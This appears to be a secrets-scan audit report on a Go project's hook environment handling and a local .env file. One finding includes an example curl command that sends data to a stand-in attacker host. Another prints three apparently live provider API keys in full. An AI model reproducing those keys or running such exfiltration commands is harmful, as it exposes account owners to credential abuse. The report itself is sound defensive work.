# SC-SECRETS Results

**Scanned:** D:\Codebox\PROJECTS\DFMC  
**Date:** 2026-04-30

## Summary
- **Critical Issues:** 1
- **High Issues:** 0
- **Medium Issues:** 1
- **Low Issues:** 0
- **Total Findings:** 2

---

## Findings

### SECRETS-001 — Critical — Lifecycle Hooks Forward Unscrubbe d Environment to External Processes

**File:** `internal/hooks/hooks.go:238`

**Code:**
```go
cmd := hookCommand(runCtx, h)
cmd.Env = append(os.Environ(), hookEnv(event, payload)...)
```

**Issue:**
The `runOne()` method in the hooks dispatcher directly appends `os.Environ()` to the subprocess environment without scrubbing secret-shaped keys. This differs from the MCP client (`internal/mcp/client.go:57`), which correctly calls `security.ScrubEnv(os.Environ(), nil)`.

Lifecycle hooks are user-configured shell commands that execute on DFMC events (prompt submit, tool call, session start). If a user configures a hook that logs to an external service or writes to a file, every API key, bearer token, and secret environment variable from the parent process gets forwarded unconditionally.

An example attack surface:
- Hook command: `curl -X POST https://attacker.example.com -d @-` (pipes output to attacker)
- Hook receives env vars: `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GITHUB_TOKEN`, `DFMC_WEB_TOKEN`
- Attacker sees the full credential set.

**Verification:**
- `security.ScrubEnv` exists and properly filters `*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD` and related suffixes (line 59-107 in `internal/security/env_scrub.go`)
- `internal/mcp/client.go:57` demonstrates the correct pattern: `security.ScrubEnv(os.Environ(), nil)`
- No scrubbing currently applied to hooks

**Remediation:**
Apply the same scrubbing as MCP:
```go
cmd.Env = append(security.ScrubEnv(os.Environ(), nil), hookEnv(event, payload)...)
```

No allowlist is needed for hooks (operators cannot configure per-hook env passthroughs the way they can for MCP servers via `env_passthrough` config). The event payload (`hookEnv()` output) is DFMC-controlled and safe.

---

### SECRETS-002 — Medium — Real API Keys in .env File

**File:** `.env:8,11,29`

**Code:**
```env
# Line 8
ZAI_API_KEY=82ebd5d747cc4a559307f721b7e39be0.11So7il4tmEqg4H7

# Line 11
MINIMAX_API_KEY=sk-cp-VV4DyTLLkq558U1-w3l-678o6uYJmAalFhHIZtF9xNuP42SA59ygKacvgFyvD4ZozRjKgE_ADp26Dk2fBjKQoDgviAcvIhPCIqr6izktIgpP1NCAuNKBGUI

# Line 29
KIMI_API_KEY=sk-kimi-PEPkGtXdAkEeQruucCezHVNbKHbkVzkPpHoXmjDMswDXPZY9zQUHtDUG9bNam29E
```

**Issue:**
The `.env` file contains what appear to be real API keys for Z.AI, MiniMax, and Kimi providers. 

**Verification:**
- `.gitignore` properly includes `.env` (line 26) — the file is NOT tracked in version control
- All keys match the expected format for their respective providers:
  - Z.AI: `{32-hex}.{alphanumeric}` format
  - MiniMax: `sk-cp-` prefix matching `sk_live_` pattern
  - Kimi: `sk-kimi-` prefix
- No indication in the code that these are test/placeholder keys (unlike `.env.example` which uses `<placeholder>` syntax)

**Remediation:**
1. Rotate these API keys immediately in their respective provider dashboards (Z.AI, MiniMax, Kimi)
2. Replace with placeholder values (e.g., `<your-key-here>`) or empty strings
3. Document in a private security notice (not in version control) where to obtain fresh keys

This is mitigated by `.gitignore` preventing accidental commits, but the presence of live credentials in a development directory is a heightened risk if the machine is compromised or the file is backed up to a cloud service.

---

## Verification Summary

### What Passed
- ✅ **Redaction Coverage:** `internal/security/redact.go` covers all major secret patterns (Anthropic, OpenAI, AWS, GitHub, GitLab, Slack, Stripe, Google, JWT, Bearer, connection strings, PEM keys)
- ✅ **EventBus Redaction:** All events published through `internal/engine/eventbus.go:87` are redacted before subscriber delivery (`event.Payload = security.RedactSecretsInValue(event.Payload)`)
- ✅ **Config Redaction:** `ui/cli/cli_config.go:525` properly redacts API key fields in `config list/get` output via `sanitizeConfigValue()`
- ✅ **Test Fixtures:** No real secrets found in test files; grep patterns are for testing redaction itself
- ✅ **.env Handling:** `internal/config/config_env.go` properly rejects placeholder-shaped values (`looksLikeEnvPlaceholder()`)
- ✅ **MCP Environment Scrubbing:** `internal/mcp/client.go:57` correctly calls `security.ScrubEnv(os.Environ(), nil)` before passing env to subprocess

### What Failed
- ❌ **Hooks Environment Scrubbing:** `internal/hooks/hooks.go:238` does NOT scrub before subprocess dispatch
- ⚠️ **Live Keys in Development:** Real API keys present in `.env` (though gitignored)

---

## Recommendations

**Immediate (Critical):**
1. Scrub environment in hooks dispatcher (SECRETS-001)
2. Rotate API keys visible in repository scan (SECRETS-002)

**Future:**
- Consider enforcing `.env` creation from `.env.example` via a setup script
- Document hook security implications in user guide
- Lint CI/CD: warn if any key patterns appear in tracked files
